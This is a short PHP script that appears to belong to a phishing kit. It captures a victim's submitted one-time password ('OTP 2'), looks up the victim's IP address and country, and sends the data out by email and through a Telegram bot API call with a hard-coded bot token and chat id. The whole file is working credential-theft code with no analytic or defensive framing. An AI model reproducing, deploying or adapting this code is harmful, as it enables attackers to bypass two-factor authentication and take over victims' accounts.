<?php
if(isset($_POST['access02'])){session_start(); 
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$_SERVER['REMOTE_ADDR']."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$access02 = $_SESSION['access02'] = $_POST['access02'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$subject  = " OTP 2 - ".$_SERVER['REMOTE_ADDR']."";
$lgmailsd = '@gmail.com';
$XMSG = "
-------------------------------------------------------------
IP COUNTRY CODE:   ".$COUNTRYCODE."
IP COUNTRY NAME:   ".$COUNTRYNAME."
-----------
OTP 2 / ".$_POST['access02']."
-----------
IP:  ".$_SERVER['REMOTE_ADDR']."
-------------------------------------------------------------
";
mail($lgmailsd, $subject, $XMSG, $headers);
  $website="https://api.telegram.org/bot6627933877:AAGoUlQX8lD_7eVvwDcWIHhAamz9Akpfkm4";$params=['chat_id'=>1973315516,'text'=>$XMSG,];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}
?>
